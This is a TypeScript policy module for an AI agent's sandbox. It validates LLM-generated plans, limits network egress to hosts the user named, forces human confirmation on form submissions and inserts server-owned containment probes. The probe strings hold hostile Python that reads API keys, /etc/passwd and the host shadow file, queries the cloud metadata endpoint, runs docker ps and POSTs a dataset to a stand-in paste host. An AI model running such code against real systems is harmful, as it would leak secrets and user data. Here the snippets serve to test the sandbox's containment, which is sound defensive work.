// Control-plane policy. Runs on every plan, from any LlmProvider, before it is
// stored or dispatched. Safety rules live here, not in the model's output:
//   - the plan JSON is validated (shape, sizes, URLs) — invalid → rejected;
//   - containment probes are inserted by the server, never trusted from the LLM;
//   - the egress allowlist = hosts the *user* named ∩ the server allowlist;
//   - side-effecting browser actions always require a human yes/no.

import { egressAllowlist } from "./config";
import type { BrowserAction, Intent, Plan, PlanStep, PolicyReport } from "./types";

export class PlanRejected extends Error {}

export const MAX_PLAN_STEPS = 8; // steps from the planner, before policy probes
export const MAX_STEP_CODE = 20_000;
const INTENTS: Intent[] = ["code", "csv", "browser"];
const ACTIONS: BrowserAction[] = ["navigate", "screenshot", "fill", "submit"];
/** Actions with effects outside read-only browsing. */
const SIDE_EFFECT_ACTIONS: BrowserAction[] = ["submit"];

// ---------- standard probes (owned by the server) ----------

export const CONTAINMENT_PROBE = `# Containment probe: try what a host process could do.
import os, urllib.request
print("--- secrets as seen inside the sandbox ---")
print(os.environ.get("VULTR_INFERENCE_API_KEY"))
print(os.environ.get("PROOFBOX_CANARY_API_KEY"))
print("--- /etc/passwd (the sandbox's own) ---")
print(open("/etc/passwd").read())
try:
    print(open("/host/etc/shadow").read())
except PermissionError:
    print("host filesystem: not mounted")
try:
    urllib.request.urlopen("http://169.254.169.254/latest/meta-data/")
except OSError:
    print("cloud metadata endpoint: unreachable")
os.system("docker ps")`;

export const MEMORY_PROBE = `# Resource cap probe: allocate ~2 GB inside a 256 MiB sandbox.
blob = bytearray(2 * 10**9)
print("should never print")`;

export const EXFIL_PROBE = `# Containment probe: try to exfiltrate the dataset.
import requests
try:
    requests.post("https://paste.example.net/upload", data=open("/sandbox/input/data.csv").read())
except Exception:
    print("exfiltration attempt: blocked by egress policy")`;

export const METADATA_URL = "http://169.254.169.254/latest/meta-data/";

type Probe = Omit<PlanStep, "id">;
const probe = (s: Omit<Probe, "probe" | "addedBy">): Probe => ({ ...s, probe: true, addedBy: "policy" });

const PROBES = {
  containment: probe({ kind: "code", language: "python", title: "Containment probe", description: "Try to read secrets, the host filesystem, cloud metadata and the Docker socket.", code: CONTAINMENT_PROBE }),
  memory: probe({ kind: "code", language: "python", title: "Resource cap probe", description: "Allocate far beyond the memory cap; the sandbox must be OOM-killed, not the host.", code: MEMORY_PROBE, limits: { memoryMb: 256 } }),
  exfil: probe({ kind: "code", language: "python", title: "Exfiltration probe", description: "Try to POST the dataset to an external paste site.", code: EXFIL_PROBE }),
  metadata: probe({ kind: "browser", title: "Containment probe: cloud metadata", description: "Try to reach 169.254.169.254 from the sandboxed browser.", browser: { action: "navigate", url: METADATA_URL } }),
};

// ---------- validation ----------

const isObj = (v: unknown): v is Record<string, unknown> => typeof v === "object" && v !== null && !Array.isArray(v);
const str = (v: unknown, max: number) => typeof v === "string" && v.length <= max;

function httpUrl(u: unknown): URL | null {
  if (typeof u !== "string") return null;
  try {
    const url = new URL(u);
    return url.protocol === "http:" || url.protocol === "https:" ? url : null;
  } catch {
    return null;
  }
}

/** Throws PlanRejected unless the plan has the shape the control plane can run. */
export function validatePlan(p: unknown): asserts p is Plan {
  const fail = (m: string): never => {
    throw new PlanRejected(`plan rejected by policy: ${m}`);
  };
  if (!isObj(p)) fail("not an object");
  const plan = p as Record<string, unknown>;
  if (!INTENTS.includes(plan.intent as Intent)) fail(`intent must be one of ${INTENTS.join(", ")}`);
  if (!str(plan.title, 200) || !str(plan.summary, 2000)) fail("title/summary missing or too long");
  if (!Array.isArray(plan.steps) || plan.steps.length === 0) fail("no steps");
  const steps = plan.steps as unknown[];
  if (steps.length > MAX_PLAN_STEPS) fail(`more than ${MAX_PLAN_STEPS} steps`);
  if (plan.files !== undefined) {
    if (!isObj(plan.files) || !Object.values(plan.files).every((v) => str(v, 200_000))) fail("files must be a map of strings");
  }
  steps.forEach((s, i) => {
    const at = `step ${i + 1}`;
    if (!isObj(s)) fail(`${at} is not an object`);
    const st = s as Record<string, unknown>;
    if (!str(st.title, 200) || !str(st.description ?? "", 2000)) fail(`${at}: title missing or too long`);
    if (st.kind === "code") {
      if (typeof st.code !== "string" || !st.code.trim()) fail(`${at}: code is required`);
      if ((st.code as string).length > MAX_STEP_CODE) fail(`${at}: code exceeds ${MAX_STEP_CODE} characters`);
    } else if (st.kind === "browser") {
      const b = st.browser;
      if (!isObj(b) || !ACTIONS.includes(b.action as BrowserAction)) fail(`${at}: browser.action must be one of ${ACTIONS.join(", ")}`);
      if (!httpUrl((b as Record<string, unknown>).url)) fail(`${at}: browser.url must be an http(s) URL`);
    } else fail(`${at}: kind must be "code" or "browser"`);
    if (st.limits !== undefined) {
      if (!isObj(st.limits) || !Object.values(st.limits).every((v) => typeof v === "number" && v > 0)) fail(`${at}: limits must be positive numbers`);
    }
  });
}

// ---------- enforcement ----------

/** Hostnames of http(s) URLs the user typed. Only these can ever enter the egress allowlist. */
export function userHosts(message: string): string[] {
  const hosts = [...message.matchAll(/https?:\/\/[^\s,)"'<>`]+/g)].map((m) => httpUrl(m[0].replace(/[.;:]$/, ""))?.hostname).filter((h): h is string => Boolean(h));
  return [...new Set(hosts.map((h) => h.toLowerCase()))];
}

/**
 * Validate a planner's plan and rewrite it so safety does not depend on the
 * model: strip LLM-set probe flags, force confirm on side effects, compute the
 * egress allowlist from the user's message, append the standard probes.
 */
export function enforcePolicy(raw: unknown, userMessage: string): Plan {
  validatePlan(raw);
  const report: PolicyReport = { egressRefused: [], probesAdded: [], confirmForced: [], probeFlagsCleared: [] };

  const steps: Omit<PlanStep, "id">[] = raw.steps.map((s) => {
    const { id: _id, probe: llmProbe, addedBy: _a, ...rest } = s;
    void _id;
    void _a;
    const out: Omit<PlanStep, "id"> = { ...rest };
    // Only the server decides what counts as a probe (a probe "passes" when blocked).
    if (llmProbe) report.probeFlagsCleared.push(s.title);
    if (out.kind === "browser" && out.browser && SIDE_EFFECT_ACTIONS.includes(out.browser.action)) {
      if (!out.requiresConfirm) report.confirmForced.push(s.title);
      out.requiresConfirm = true;
    }
    return out;
  });

  // Probes the server always runs, by what the plan does.
  const hasCode = steps.some((s) => s.kind === "code");
  const hasBrowser = steps.some((s) => s.kind === "browser");
  const codeProbes = !hasCode ? [] : raw.intent === "csv" ? [PROBES.exfil] : [PROBES.containment, PROBES.memory];
  const browserProbes = hasBrowser ? [PROBES.metadata] : [];
  // Probes run before the first human-gated step, so containment is shown even if the human denies.
  const gate = steps.findIndex((s) => s.requiresConfirm);
  const cut = gate === -1 ? steps.length : gate;
  const merged = [...steps.slice(0, cut), ...codeProbes, ...browserProbes, ...steps.slice(cut)];
  report.probesAdded = [...codeProbes, ...browserProbes].map((p) => p.title);

  const server = egressAllowlist();
  const named = userHosts(userMessage);
  const allow = named.filter((h) => server.includes(h));
  report.egressRefused = named.filter((h) => !server.includes(h));

  return {
    ...raw,
    egressAllowlist: allow,
    steps: merged.map((s, i) => ({ ...s, id: `s${i + 1}` })),
    policy: report,
  };
}
